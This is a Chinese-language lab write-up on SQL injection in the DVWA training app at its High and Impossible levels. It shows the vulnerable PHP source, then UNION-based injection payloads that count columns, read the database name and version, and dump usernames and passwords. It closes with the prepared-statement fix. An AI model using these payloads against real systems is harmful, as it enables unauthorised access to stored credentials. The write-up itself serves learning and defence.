# DVWA SQL Injection (High)

## 实验环境

* Kali Linux
* DVWA
* Burp Suite
* Security Level：High

---

## 漏洞简介

在High级别中，DVWA进一步提高了SQL注入利用难度。

与Low和Medium级别不同，用户输入不再直接提交并显示结果，而是通过独立页面输入数据，再返回原页面显示查询结果。

这种设计增加了攻击过程的复杂度，但并未从根本上解决SQL注入问题。

---

## 源码分析

High级别核心代码如下：

```php
$id = $_SESSION['id'];

$query = "SELECT first_name, last_name
FROM users
WHERE user_id = '$id'
LIMIT 1;";
```

可以看到：

* 用户输入被保存到Session中；
* 查询时从Session中读取数据；
* 用户输入仍然被直接拼接到SQL语句中；

虽然开发者改变了数据传递方式，但SQL语句依旧采用字符串拼接构造。

因此漏洞依然存在。

---

## 漏洞原理

High级别的主要变化并非过滤用户输入，而是改变了用户与系统交互的方式。

攻击流程变为：

用户输入

↓

数据写入Session

↓

页面重新读取Session数据

↓

拼接SQL语句

↓

执行数据库查询

虽然攻击者无法像Low级别一样直接观察请求参数，但最终执行的SQL语句依然受到用户输入影响。

因此本质上仍属于SQL注入漏洞。

---

## 漏洞利用过程

### 1. 判断注入点

输入：

```sql
'
```

页面出现异常。

说明用户输入可能参与SQL语句构造。

---

### 2. 判断字段数量

依次测试：

```sql
1' order by 1#
```

```sql
1' order by 2#
```

```sql
1' order by 3#
```

测试结果表明：

* order by 1 正常；
* order by 2 正常；
* order by 3 报错；

说明查询结果共有2个字段。

---

### 3. 确定回显位

Payload：

```sql
1' union select 1,2#
```

页面成功显示：

```text
1
2
```

说明两个字段均可回显。

---

### 4. 获取数据库信息

获取数据库名称：

```sql
1' union select database(),2#
```

获取数据库版本：

```sql
1' union select version(),2#
```

成功获得数据库信息。

---

### 5. 获取表名与字段名

利用MySQL系统库：

```sql
information_schema.tables
```

和：

```sql
information_schema.columns
```

继续枚举数据库结构。

---

### 6. 获取用户数据

Payload：

```sql
1' union select user,password
from users#
```

成功获取数据库中的用户名及密码信息。

---

## 漏洞形成原因

High级别虽然隐藏了输入过程，并通过Session传递数据。

但用户输入最终仍然被直接拼接进入SQL语句。

因此：

* SQL结构可控；
* 查询逻辑可修改；
* 数据可被枚举；

漏洞依然存在。

---

## 防御措施

* 参数化查询
* Prepared Statement
* 输入校验
* 最小权限原则

---

## 学习总结

High级别并未真正修复SQL注入漏洞，而是通过修改交互方式提高利用难度。

本实验进一步理解了：

* Session数据传递机制；
* SQL注入利用流程；
* UNION查询利用方式；
* 数据库信息枚举过程；

同时认识到：

改变页面结构并不能消除SQL注入风险，只有从SQL语句构造方式入手才能真正解决问题。

---

# DVWA SQL Injection (Impossible)

## 漏洞简介

Impossible级别是DVWA中用于展示正确防御方式的示例。

与前几个级别不同，该级别采用参数化查询实现用户输入与SQL代码的分离，从根本上消除了SQL注入漏洞。

---

## 源码分析

核心代码如下：

```php
$stmt = $pdo->prepare(
    "SELECT first_name,last_name
     FROM users
     WHERE user_id = :id"
);

$stmt->bindParam(':id',$id,PDO::PARAM_INT);

$stmt->execute();
```

与前几个等级相比：

* SQL语句提前编译；
* 用户输入通过参数传入；
* 用户输入不会参与SQL结构解析；

因此攻击者无法修改原有SQL逻辑。

---

## 防御原理

Prepared Statement（预编译语句）执行过程：

SQL模板

↓

数据库预编译

↓

接收用户输入

↓

参数绑定

↓

执行查询

在整个过程中：

用户输入始终被视为普通数据。

即使输入：

```sql
1' union select user,password from users#
```

数据库也不会将其解释为SQL代码执行。

---

## 输入校验

Impossible级别还增加了输入验证机制。

例如：

```php
if(is_numeric($id))
```

只有符合要求的数据才会被处理。

需要注意的是：

输入校验只能作为辅助防御措施。

真正保证安全的是：

```text
Prepared Statement
参数化查询
```

而不是简单过滤字符或限制输入类型。

---

## 为什么Impossible能够防御SQL注入

因为：

* 用户输入与SQL代码彻底分离；
* 数据库不会解析用户输入中的SQL语句；
* 攻击者无法控制SQL结构；

因此从根本上消除了SQL注入漏洞。

---

## 学习总结

通过Impossible级别源码分析，理解了SQL注入防御的核心思想。

前几个等级虽然尝试：

* 过滤字符；
* 修改页面结构；
* 改变数据传递方式；

但仍然存在SQL语句拼接问题。

只有采用：

* Prepared Statement
* 参数化查询

才能真正防止SQL注入攻击。

这也是现代Web开发中最推荐的数据库访问方式。
